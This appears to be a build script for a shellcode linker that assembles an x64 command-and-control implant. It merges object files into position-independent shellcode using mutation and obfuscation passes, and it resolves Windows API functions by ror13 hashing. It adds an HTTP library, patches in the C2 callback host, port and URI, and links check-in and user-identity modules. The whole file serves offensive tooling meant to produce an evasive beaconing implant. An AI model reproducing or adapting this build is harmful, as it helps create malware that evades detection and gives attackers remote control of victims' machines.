x64:
	# Load the COFF.
	load "bin/main.o"
	make coff
	
	# Merge in other objects.
	load "bin/vault.o"
	merge
	
	load "bin/message.o"
	merge
	
	load "bin/params.o"
	merge

	load "bin/pico.o"
	merge
	
	load "bin/util.o"
	merge
	
	export
	
	# Make the shellcode.
	make pic +optimize +gofirst +disco +mutate +regdance +blockparty
	
	# Merge in LibTCG.
	mergelib "lib/libtcg/libtcg.x64.zip"
	
	# Merge in LibWinHttp.
	mergelib "lib/LibWinHttp/libwinhttp.x64.zip"
	
	# Opt into dynamic function resolution using the resolve() function.
	dfr "resolve" "ror13" "KERNEL32, NTDLL"
	dfr "resolve_unloaded" "strings"
	
	# Patch in string parameters from the C2.
	pack $RAW_PARAMS "zziiz" %PAYLOAD_UUID %CALLBACK_HOST %CALLBACK_PORT %CALLBACK_HTTPS %CALLBACK_URI
	patch "RAW_PARAMS" $RAW_PARAMS
	
	# Load built-in PICOs.
	load "bin/pico_checkin.o"
		make object +optimize
		export
		link "pico_checkin"
		
	load "bin/pico_getuid.o"
		make object +optimize
		export
		link "pico_getuid"

 	# Export the resulting PIC.
	export
